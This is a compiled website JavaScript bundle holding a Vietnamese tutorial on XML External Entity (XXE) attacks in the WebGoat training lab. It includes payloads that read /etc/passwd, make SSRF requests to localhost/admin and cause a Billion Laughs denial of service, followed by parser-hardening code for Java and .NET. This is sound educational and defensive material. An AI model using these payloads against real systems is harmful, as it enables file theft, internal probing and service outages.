"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[2079],{14265:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>c,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01","title":"1.01 | XXE","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","source":"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01.md","sourceDirName":"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration","slug":"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01","permalink":"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01","draft":false,"unlisted":false,"editUrl":"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01.md","tags":[{"inline":true,"label":"web-security","permalink":"/docs/tags/web-security"},{"inline":true,"label":"webgoat","permalink":"/docs/tags/webgoat"},{"inline":true,"label":"security-misconfiguration","permalink":"/docs/tags/security-misconfiguration"},{"inline":true,"label":"xxe","permalink":"/docs/tags/xxe"},{"inline":true,"label":"webgoat-2023.8","permalink":"/docs/tags/webgoat-2023-8"}],"version":"current","lastUpdatedAt":1755945789000,"sidebarPosition":1,"frontMatter":{"title":"1.01 | XXE","slug":"XXE-01","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","image":"https://tiennhm.github.io/img/docs/database.jpg","sidebar_position":1,"tags":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"keywords":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"enableComments":true,"draft":false},"sidebar":"tutorialSidebar","previous":{"title":"A5 - Security Misconfiguration","permalink":"/docs/category/a5---security-misconfiguration"},"next":{"title":"1.02 | XXE","permalink":"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02"}}');var s=t(74848),r=t(28453);const c={title:"1.01 | XXE",slug:"XXE-01",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},l=void 0,o={},a=[{value:"\ud83d\udd25 <strong>1. Kh\xe1i ni\u1ec7m</strong>",id:"-1-kh\xe1i-ni\u1ec7m",level:2},{value:"\ud83d\udee0 <strong>2. C\xe1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng c\u1ee7a XXE</strong>",id:"-2-c\xe1ch-th\u1ee9c-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-xxe",level:2},{value:"\ud83d\ude80 <strong>3. T\u1ea5n c\xf4ng XXE</strong>",id:"-3-t\u1ea5n-c\xf4ng-xxe",level:2},{value:"<strong>(1) \u0110\u1ecdc file t\u1eeb server</strong>",id:"1-\u0111\u1ecdc-file-t\u1eeb-server",level:3},{value:"<strong>(2) SSRF Attack (T\u1ea5n c\xf4ng d\u1ecbch v\u1ee5 n\u1ed9i b\u1ed9)</strong>",id:"2-ssrf-attack-t\u1ea5n-c\xf4ng-d\u1ecbch-v\u1ee5-n\u1ed9i-b\u1ed9",level:3},{value:"<strong>(3) DoS Attack (Billion Laughs Attack)</strong>",id:"3-dos-attack-billion-laughs-attack",level:3},{value:"\ud83d\udee1 <strong>4. C\xe1ch ph\xf2ng ch\u1ed1ng XXE</strong>",id:"-4-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",level:2}];function h(n){const e={blockquote:"blockquote",br:"br",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsxs)(e.p,{children:["\ud83d\udee1 ",(0,s.jsx)(e.strong,{children:"XML External Entity (XXE) Attack"})]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-1-kh\xe1i-ni\u1ec7m",children:["\ud83d\udd25 ",(0,s.jsx)(e.strong,{children:"1. Kh\xe1i ni\u1ec7m"})]}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.strong,{children:"XXE (XML External Entity Attack)"})," l\xe0 m\u1ed9t l\u1ed7 h\u1ed5ng b\u1ea3o m\u1eadt khi \u1ee9ng d\u1ee5ng x\u1eed l\xfd XML m\xe0 kh\xf4ng v\xf4 hi\u1ec7u h\xf3a th\u1ef1c th\u1ec3 b\xean ngo\xe0i (external entity). Hacker c\xf3 th\u1ec3 khai th\xe1c \u0111\u1ec3:"]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u0110\u1ecdc file tr\xean server"}),"\n",(0,s.jsx)(e.li,{children:"R\xf2 r\u1ec9 th\xf4ng tin nh\u1ea1y c\u1ea3m"}),"\n",(0,s.jsx)(e.li,{children:"Th\u1ef1c hi\u1ec7n Server-Side Request Forgery (SSRF)"}),"\n",(0,s.jsx)(e.li,{children:"T\u1ea5n c\xf4ng DoS"}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-2-c\xe1ch-th\u1ee9c-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-xxe",children:["\ud83d\udee0 ",(0,s.jsx)(e.strong,{children:"2. C\xe1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng c\u1ee7a XXE"})]}),"\n",(0,s.jsx)(e.p,{children:"Khi m\u1ed9t XML parser cho ph\xe9p external entity, hacker c\xf3 th\u1ec3 ch\xe8n payload \u0111\u1ec3 truy xu\u1ea5t d\u1eef li\u1ec7u t\u1eeb server."}),"\n",(0,s.jsx)(e.p,{children:"V\xed d\u1ee5, m\u1ed9t \u1ee9ng d\u1ee5ng nh\u1eadn XML t\u1eeb user:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [  \n    <!ENTITY xxe SYSTEM "file:///etc/passwd">  \n]>\n<user>\n    <name>&xxe;</name>\n</user>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["N\u1ebfu server x\u1eed l\xfd XML m\xe0 kh\xf4ng t\u1eaft external entity, n\xf3 s\u1ebd thay ",(0,s.jsx)(e.code,{children:"&xxe;"})," b\u1eb1ng n\u1ed9i dung file ",(0,s.jsx)(e.code,{children:"/etc/passwd"}),"."]}),"\n",(0,s.jsxs)(e.h2,{id:"-3-t\u1ea5n-c\xf4ng-xxe",children:["\ud83d\ude80 ",(0,s.jsx)(e.strong,{children:"3. T\u1ea5n c\xf4ng XXE"})]}),"\n",(0,s.jsx)(e.h3,{id:"1-\u0111\u1ecdc-file-t\u1eeb-server",children:(0,s.jsx)(e.strong,{children:"(1) \u0110\u1ecdc file t\u1eeb server"})}),"\n",(0,s.jsx)(e.p,{children:"G\u1eedi XML v\u1edbi entity tr\u1ecf \u0111\u1ebfn file h\u1ec7 th\u1ed1ng:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE data [\n    <!ENTITY file SYSTEM "file:///etc/passwd">\n]>\n<data>&file;</data>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["N\u1ebfu b\u1ecb khai th\xe1c, response s\u1ebd ch\u1ee9a n\u1ed9i dung file ",(0,s.jsx)(e.code,{children:"/etc/passwd"}),"."]}),"\n",(0,s.jsx)(e.h3,{id:"2-ssrf-attack-t\u1ea5n-c\xf4ng-d\u1ecbch-v\u1ee5-n\u1ed9i-b\u1ed9",children:(0,s.jsx)(e.strong,{children:"(2) SSRF Attack (T\u1ea5n c\xf4ng d\u1ecbch v\u1ee5 n\u1ed9i b\u1ed9)"})}),"\n",(0,s.jsx)(e.p,{children:"D\xf9ng XXE \u0111\u1ec3 g\u1eedi request \u0111\u1ebfn n\u1ed9i b\u1ed9 h\u1ec7 th\u1ed1ng:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE foo [\n    <!ENTITY xxe SYSTEM "http://localhost/admin">\n]>\n<user>\n    <name>&xxe;</name>\n</user>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["N\u1ebfu server c\xf3 API n\u1ed9i b\u1ed9 tr\xean ",(0,s.jsx)(e.code,{children:"localhost/admin"}),", hacker c\xf3 th\u1ec3 khai th\xe1c n\xf3."]}),"\n",(0,s.jsx)(e.h3,{id:"3-dos-attack-billion-laughs-attack",children:(0,s.jsx)(e.strong,{children:"(3) DoS Attack (Billion Laughs Attack)"})}),"\n",(0,s.jsx)(e.p,{children:"D\xf9ng recursion \u0111\u1ec3 t\u1ea1o v\xf4 s\u1ed1 entity g\xe2y crash server:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n    <!ENTITY lol "LOL">\n    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">\n    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;">\n    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">\n]>\n<data>&lol3;</data>\n'})}),"\n",(0,s.jsxs)(e.h2,{id:"-4-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",children:["\ud83d\udee1 ",(0,s.jsx)(e.strong,{children:"4. C\xe1ch ph\xf2ng ch\u1ed1ng XXE"})]}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"V\xf4 hi\u1ec7u h\xf3a DTD & external entity trong XML parser"}),(0,s.jsx)(e.br,{}),"\n","Trong Java:"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n'})}),"\n",(0,s.jsx)(e.p,{children:"Trong .NET:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-csharp",children:"XmlReaderSettings settings = new XmlReaderSettings();\nsettings.DtdProcessing = DtdProcessing.Prohibit;\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"S\u1eed d\u1ee5ng JSON thay v\xec XML"}),(0,s.jsx)(e.br,{}),"\n","JSON kh\xf4ng c\xf3 entity n\xean an to\xe0n h\u01a1n."]}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"Gi\u1edbi h\u1ea1n quy\u1ec1n \u0111\u1ecdc file tr\xean server"}),(0,s.jsx)(e.br,{}),"\n","D\xf9ng ",(0,s.jsx)(e.code,{children:"chroot"}),", SELinux ho\u1eb7c AppArmor \u0111\u1ec3 gi\u1edbi h\u1ea1n ph\u1ea1m vi \u0111\u1ecdc file."]}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"D\xf9ng WAF (Web Application Firewall)"}),(0,s.jsx)(e.br,{}),"\n","Ch\u1eb7n payload ch\u1ee9a ",(0,s.jsx)(e.code,{children:"<!ENTITY"})," ho\u1eb7c ",(0,s.jsx)(e.code,{children:"SYSTEM"}),"."]})]})}function d(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(h,{...n})}):h(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>c,x:()=>l});var i=t(96540);const s={},r=i.createContext(s);function c(n){const e=i.useContext(r);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:c(n.components),i.createElement(r.Provider,{value:e},n.children)}}}]);